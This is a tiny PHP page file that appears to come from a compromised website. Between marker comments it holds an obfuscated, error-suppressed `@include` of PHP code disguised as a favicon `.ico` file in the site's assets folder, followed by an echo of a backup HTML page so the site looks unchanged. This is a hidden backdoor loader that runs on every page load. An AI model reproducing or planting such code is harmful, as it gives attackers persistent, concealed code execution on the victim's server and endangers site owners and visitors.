<?php
/*d50b6*/

@include "\x2fhom\x65/sw\x61roo\x70rbo\x62by/\x70ubl\x69c_h\x74ml/\x73tor\x6bks.\x63om/\x61sse\x74s/a\x73set\x73/fa\x76ico\x6e_35\x61d47\x2eico";

/*d50b6*/


echo file_get_contents('index.html.bak.bak');